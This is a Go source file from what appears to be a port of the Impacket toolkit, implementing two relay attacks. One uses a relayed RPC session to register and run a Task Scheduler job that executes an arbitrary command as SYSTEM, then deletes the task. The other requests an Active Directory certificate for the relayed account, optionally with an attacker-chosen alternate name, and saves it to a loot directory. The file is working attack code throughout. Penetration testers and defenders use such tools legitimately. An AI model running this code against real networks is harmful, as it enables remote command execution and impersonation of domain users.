// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Jacob Paullus

package relay

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"log"
	mrand "math/rand"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"gopacket/internal/build"
	"gopacket/pkg/dcerpc/icpr"
	"gopacket/pkg/dcerpc/tsch"

	"software.sslmate.com/src/go-pkcs12"
)

// RPCTschExecAttack executes a command via the Task Scheduler over a direct RPC connection.
// Unlike TschExecAttack (which goes through SMB named pipes), this uses RPC-level auth
// from the BIND/AUTH3 relay, bypassing the need for SMB session-level admin.
// Matches Impacket's TSCHRPCAttack in rpcattack.py.
type RPCTschExecAttack struct{}

func (a *RPCTschExecAttack) Name() string { return "rpctschexec" }

func (a *RPCTschExecAttack) Run(session interface{}, config *Config) error {
	rpcSession, ok := session.(*RPCRelaySession)
	if !ok {
		return fmt.Errorf("rpctschexec attack requires RPC session (got %T)", session)
	}

	if rpcSession.Mode != "TSCH" {
		return fmt.Errorf("rpctschexec requires TSCH mode (got %s)", rpcSession.Mode)
	}

	if config.Command == "" {
		return fmt.Errorf("no command specified (-c flag)")
	}

	log.Printf("[*] Executing command via Task Scheduler (RPC relay)...")

	// The dcerpc.Client is already bound to ITaskSchedulerService from the BIND relay
	ts := tsch.NewTaskScheduler(rpcSession.Client)

	// Generate random task name (matches Impacket pattern)
	taskName := fmt.Sprintf("\\gopacket%04x", mrand.Intn(0xFFFF))

	// Build task XML (runs as SYSTEM with HighestAvailable)
	taskXML := buildTaskXML(config.Command)

	if build.Debug {
		log.Printf("[D] RPCTschExec: registering task %s", taskName)
	}

	// Register task
	actualPath, err := ts.RegisterTask(taskName, taskXML, tsch.TASK_CREATE)
	if err != nil {
		return fmt.Errorf("register task: %v", err)
	}

	log.Printf("[*] Task %s registered successfully", actualPath)

	// Run task
	if err := ts.Run(actualPath); err != nil {
		log.Printf("[-] Task run returned: %v", err)
	} else {
		log.Printf("[*] Task executed")
	}

	// Wait briefly for execution, then clean up (matches Impacket behavior)
	time.Sleep(2 * time.Second)

	// Delete task
	if err := ts.Delete(actualPath); err != nil {
		log.Printf("[-] Warning: failed to delete task %s: %v", actualPath, err)
	} else {
		log.Printf("[*] Task %s deleted", actualPath)
	}

	log.Printf("[+] Command executed via Task Scheduler (RPC): %s", config.Command)

	return nil
}

// icprElevated tracks already-attacked users to prevent duplicate certificate requests.
var (
	icprElevated   = make(map[string]bool)
	icprElevatedMu sync.Mutex
)

// RPCICPRAttack requests a certificate via the ICPR interface over a direct RPC connection.
// This is the RPC-based alternative to ADCSAttack (which uses HTTP relay to /certsrv/).
// Matches Impacket's ICPRRPCAttack in rpcattack.py.
type RPCICPRAttack struct{}

func (a *RPCICPRAttack) Name() string { return "icpr" }

func (a *RPCICPRAttack) Run(session interface{}, config *Config) error {
	rpcSession, ok := session.(*RPCRelaySession)
	if !ok {
		return fmt.Errorf("ICPR attack requires RPC session (got %T)", session)
	}

	if rpcSession.Mode != "ICPR" {
		return fmt.Errorf("ICPR attack requires ICPR mode (got %s)", rpcSession.Mode)
	}

	if config.ICPRCAName == "" {
		return fmt.Errorf("CA name is required (-icpr-ca-name flag)")
	}

	username := config.relayedUser
	domain := config.relayedDomain

	// Check if already attacked (prevent duplicate enrollment)
	icprElevatedMu.Lock()
	key := strings.ToUpper(fmt.Sprintf("%s\\%s", domain, username))
	if icprElevated[key] {
		icprElevatedMu.Unlock()
		log.Printf("[*] Skipping user %s since ICPR attack was already performed", key)
		return nil
	}
	icprElevated[key] = true
	icprElevatedMu.Unlock()

	// Generate RSA 4096-bit key pair
	log.Printf("[*] Generating RSA key...")
	privKey, err := rsa.GenerateKey(rand.Reader, 4096)
	if err != nil {
		return fmt.Errorf("generate RSA key: %v", err)
	}

	// Determine template: Machine for computer accounts, User for regular users
	template := config.Template
	if template == "" {
		if strings.HasSuffix(username, "$") {
			template = "Machine"
		} else {
			template = "User"
		}
	}

	// Generate PKCS#10 CSR (reuse generateCSR from adcs_attack.go)
	log.Printf("[*] Generating CSR...")
	csrPEM, err := generateCSR(privKey, username, config.AltName)
	if err != nil {
		return fmt.Errorf("generate CSR: %v", err)
	}

	// Parse PEM to get DER bytes for ICPR
	block, _ := pem.Decode(csrPEM)
	if block == nil {
		return fmt.Errorf("failed to decode CSR PEM")
	}
	csrDER := block.Bytes

	// Build certificate attributes
	attributes := []string{fmt.Sprintf("CertificateTemplate:%s", template)}
	if config.AltName != "" {
		attributes = append(attributes, fmt.Sprintf("SAN:upn=%s", config.AltName))
	}

	log.Printf("[*] Requesting certificate from %s (template: %s)...", config.ICPRCAName, template)

	// Call ICPR CertServerRequest
	certDER, requestID, err := icpr.CertServerRequest(rpcSession.Client, config.ICPRCAName, csrDER, attributes)
	if err != nil {
		// Check for common HRESULT errors
		errStr := err.Error()
		if strings.Contains(errStr, "0x80070057") {
			return fmt.Errorf("bad CA name '%s' — check -icpr-ca-name", config.ICPRCAName)
		}
		if strings.Contains(errStr, "0x80070005") {
			return fmt.Errorf("access denied — CA may require encryption (RPC integrity)")
		}
		return fmt.Errorf("ICPR request failed: %v", err)
	}

	log.Printf("[+] GOT CERTIFICATE! Request ID: %d", requestID)

	// Parse DER certificate
	cert, err := x509.ParseCertificate(certDER)
	if err != nil {
		return fmt.Errorf("parse certificate: %v", err)
	}

	// Export as PKCS#12 (.pfx) — reuse the same pattern as ADCSAttack
	pfxData, err := pkcs12.Modern.Encode(privKey, cert, nil, "")
	if err != nil {
		return fmt.Errorf("encode PKCS12: %v", err)
	}

	// Determine filename (matches Impacket fallback cascade)
	pfxName := username
	if pfxName == "" {
		pfxName = extractCertificateIdentity(cert)
	}
	if pfxName == "" {
		pfxName = fmt.Sprintf("certificate_%d", requestID)
	}
	pfxFilename := sanitizeFilename(pfxName) + ".pfx"
	outputPath := filepath.Join(config.LootDir, pfxFilename)

	log.Printf("[*] Writing PKCS#12 certificate to %s", outputPath)

	if err := os.MkdirAll(config.LootDir, 0755); err != nil {
		log.Printf("[!] Unable to create loot directory, printing B64 of certificate instead")
		log.Printf("[*] Base64-encoded PKCS#12 certificate (%s):\n%s", pfxFilename,
			base64.StdEncoding.EncodeToString(pfxData))
		return nil
	}

	if err := os.WriteFile(outputPath, pfxData, 0600); err != nil {
		log.Printf("[!] Unable to write certificate to file, printing B64 instead")
		log.Printf("[*] Base64-encoded PKCS#12 certificate (%s):\n%s", pfxFilename,
			base64.StdEncoding.EncodeToString(pfxData))
		return nil
	}

	log.Printf("[+] Certificate successfully written to %s", outputPath)

	if config.AltName != "" {
		log.Printf("[*] This certificate can also be used for user: %s", config.AltName)
	}

	return nil
}
